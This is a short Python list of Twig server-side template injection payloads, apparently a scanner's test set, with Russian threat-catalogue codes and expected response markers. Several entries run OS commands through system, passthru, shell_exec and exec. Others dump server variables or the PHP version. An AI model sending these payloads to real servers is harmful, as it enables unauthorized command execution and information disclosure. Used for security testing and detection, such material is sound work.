ubi_payloads = [
    {
        "ubi": "УБИ.4",
        "payload": "{{ constant('PHP_VERSION') }}",
        "expected": ".",  # версия PHP, например "8.1.2"
        "engine": "Twig"
    },
    {
        "ubi": "УБИ.5",
        "payload": "{{ dump(app.request.server) }}",
        "expected": "REQUEST_METHOD",
        "engine": "Twig"
    },
    {
        "ubi": "УБИ.4",
        "payload": "{{ ['id']|map(v => system(v))|join }}",
        "expected": "uid=",  # POSIX-совместимые системы
        "engine": "Twig"
    },
    {
        "ubi": "УБИ.8",
        "payload": "{{ ['whoami']|map(v => passthru(v))|join }}",
        "expected": None,
        "engine": "Twig"
    },
    {
        "ubi": "УБИ.10",
        "payload": "{{ ['ls']|map(v => shell_exec(v))|join }}",
        "expected": None,
        "engine": "Twig"
    },
    {
        "ubi": "УБИ.11",
        "payload": "{{ ['echo twig_rce']|map(v => exec(v))|join }}",
        "expected": "twig_rce",
        "engine": "Twig"
    },
    {
        "ubi": "УБИ.4",
        "payload": "{{ attribute(_self, '__class__').getMethods }}",
        "expected": "Reflection",
        "engine": "Twig"
    }
]
